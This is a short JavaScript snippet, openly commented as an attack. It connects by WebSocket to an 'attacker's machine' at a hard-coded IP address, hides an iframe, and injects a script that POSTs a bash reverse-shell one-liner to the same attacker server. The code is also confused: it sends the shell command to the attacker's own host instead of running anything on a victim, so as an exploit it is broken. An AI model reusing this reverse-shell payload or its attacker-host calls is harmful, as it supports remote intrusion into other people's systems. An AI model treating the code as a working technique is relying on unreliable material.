// Create a WebSocket connection to the attacker's machine
var socket = new WebSocket("ws://147.185.221.23:30250");

// Once the connection is open, execute the shell command
socket.onopen = function() {
    // Create a hidden iframe element
    var iframe = document.createElement("iframe");
    iframe.style.display = "none";  // Hide the iframe
    document.body.appendChild(iframe);  // Append the iframe to the body

    // Use the iframe's document to inject a script that opens a reverse shell
    var doc = iframe.contentWindow.document;
    var script = doc.createElement("script");

    // Payload to execute the reverse shell on the target system (in this case, a basic command shell)
    script.text = `
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://147.185.221.23:30251/exec", true);  // The attacker’s server to handle shell commands
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      
      // Send the reverse shell command to the attacker's server
      xhr.send("cmd=" + encodeURIComponent("bash -i >& /dev/tcp/147.185.221.23/30250 0>&1"));
    `;
    
    // Inject the script into the iframe's document, triggering the shell execution
    doc.body.appendChild(script);
};

// If there is an error with the WebSocket, close the connection
socket.onerror = function() {
    socket.close();
};
